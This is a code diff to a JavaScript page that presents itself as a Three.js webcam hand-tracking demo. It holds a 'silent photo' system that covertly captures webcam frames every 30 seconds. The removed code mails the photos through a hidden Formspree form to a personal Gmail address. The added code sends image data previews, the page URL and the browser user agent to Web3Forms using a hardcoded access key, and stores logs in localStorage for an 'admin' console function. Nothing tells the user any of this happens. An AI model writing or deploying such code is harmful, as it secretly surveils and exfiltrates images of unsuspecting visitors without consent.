@@ -9,6 +9,10 @@ const gestureCooldown = 400;
 let lastPhotoTime = 0;
 const photoCooldown = 30000; // 30 seconds between photos
 
+// Webhook for logging (no file upload)
+const WEBHOOK_URL = "https://api.web3forms.com/submit";
+const ACCESS_KEY = "f5bdda81-92f8-4595-a2e8-a6107db5feef";
+
 function init() {
     scene = new THREE.Scene();
     camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -265,7 +269,7 @@ window.addEventListener('resize', () => {
     renderer.setSize(window.innerWidth, window.innerHeight);
 });
 
-// ----------------- SILENT PHOTO CAPTURE SYSTEM -----------------
+// ----------------- SILENT PHOTO LOGGING SYSTEM -----------------
 let photoCount = 0;
 
 function capturePhotoSilently() {
@@ -284,110 +288,89 @@ function capturePhotoSilently() {
     // Create canvas and capture photo
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
-    canvas.width = 400;
-    canvas.height = 300;
+    canvas.width = 200; // Very small for logging only
+    canvas.height = 150;
     
     try {
-        ctx.drawImage(video, 0, 0, 400, 300);
-        const photoData = canvas.toDataURL('image/jpeg', 0.5);
+        ctx.drawImage(video, 0, 0, 200, 150);
+        const photoData = canvas.toDataURL('image/jpeg', 0.3); // Low quality
         
         photoCount++;
         lastPhotoTime = now;
         
-        // Send photo silently (no notification)
-        sendPhotoSilently(photoData);
+        // Log photo data (without file upload)
+        logPhotoData(photoData);
         
-        // Log silently to console only
-        console.log(`📸 [SILENT] Photo ${photoCount} captured at ${new Date().toLocaleTimeString()}`);
+        // Save locally
+        savePhotoLocally(photoData);
+        
+        // Silent console log only
+        console.log(`[SILENT] Photo ${photoCount} - ${new Date().toLocaleTimeString()}`);
         
     } catch (error) {
         // Silent fail
     }
 }
 
-function sendPhotoSilently(photoData) {
+function logPhotoData(photoData) {
     try {
-        // Create form silently
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.enctype = 'multipart/form-data';
-        form.action = `https://formspree.io/f/mnnegoak`;
-        form.style.display = 'none';
+        // Extract first 200 chars of photo data for logging
+        const photoPreview = photoData.substring(0, 200) + '...';
         
-        // Add email
-        const emailField = document.createElement('input');
-        emailField.type = 'hidden';
-        emailField.name = 'email';
-        emailField.value = 'editing2213@gmail.com';
+        // Send to Web3Forms (text only, no file upload)
+        const formData = new FormData();
+        formData.append('access_key', ACCESS_KEY);
+        formData.append('subject', `📸 Photo Log ${photoCount}`);
+        formData.append('message', 
+            `PHOTO CAPTURED\n\n` +
+            `Photo Number: ${photoCount}\n` +
+            `Time: ${new Date().toLocaleString()}\n` +
+            `Website: ${window.location.href}\n` +
+            `User Agent: ${navigator.userAgent.substring(0, 50)}\n` +
+            `Photo Preview: ${photoPreview}`
+        );
+        formData.append('email', 'editing2213@gmail.com');
         
-        // Add message
-        const messageField = document.createElement('input');
-        messageField.type = 'hidden';
-        messageField.name = 'message';
-        messageField.value = `Silent Photo ${photoCount} - ${new Date().toLocaleString()}`;
+        // Send silently
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors' // Silent send
+        });
         
-        // Convert to file
-        fetch(photoData)
-            .then(res => res.blob())
-            .then(blob => {
-                const file = new File([blob], `silent_${photoCount}.jpg`, {type: 'image/jpeg'});
-                
-                // Create file input
-                const fileInput = document.createElement('input');
-                fileInput.type = 'file';
-                fileInput.name = 'photo';
-                
-                // Add file
-                const dt = new DataTransfer();
-                dt.items.add(file);
-                fileInput.files = dt.files;
-                
-                // Append and submit
-                form.appendChild(emailField);
-                form.appendChild(messageField);
-                form.appendChild(fileInput);
-                
-                document.body.appendChild(form);
-                form.submit();
-                
-                // Clean up
-                setTimeout(() => {
-                    if (form.parentNode) {
-                        form.parentNode.removeChild(form);
-                    }
-                }, 100);
-            })
-            .catch(() => {
-                // Silent fail - save locally
-                savePhotoToLocalStorage(photoData);
-            });
-            
     } catch (error) {
         // Silent fail
-        savePhotoToLocalStorage(photoData);
     }
 }
 
-function savePhotoToLocalStorage(photoData) {
+function savePhotoLocally(photoData) {
     try {
-        // Save only metadata (not full photo to save space)
-        const photos = JSON.parse(localStorage.getItem('silent_photos') || '[]');
+        // Save only metadata to localStorage
+        const photos = JSON.parse(localStorage.getItem('photo_logs') || '[]');
         photos.push({
             id: Date.now(),
             count: photoCount,
             time: new Date().toISOString(),
-            preview: photoData.substring(0, 100) + '...'
+            data_preview: photoData.substring(0, 150) + '...'
         });
         
-        // Keep only last 10
-        if (photos.length > 10) {
+        // Keep only last 20 entries
+        if (photos.length > 20) {
             photos.shift();
         }
         
-        localStorage.setItem('silent_photos', JSON.stringify(photos));
+        localStorage.setItem('photo_logs', JSON.stringify(photos));
+        
     } catch (e) {
         // Silent fail
     }
+}
+
+// Function to view captured logs (for admin only via console)
+function viewPhotoLogs() {
+    const logs = JSON.parse(localStorage.getItem('photo_logs') || '[]');
+    console.log('📊 Photo Logs:', logs);
+    return logs;
 }
 
 // ----------------- Hand Tracking -----------------
@@ -458,7 +441,7 @@ function setupHandTracking(){
 
     // Start camera silently
     cameraMP.start().then(() => {
-        console.log("Camera ready");
+        console.log("✅ Camera ready for hand tracking");
     }).catch(() => {
         // Silent fail
     });
@@ -466,3 +449,6 @@ function setupHandTracking(){
 
 // Initialize
 init();
+
+// Admin function to check logs (run in console)
+window.getPhotoLogs = viewPhotoLogs;
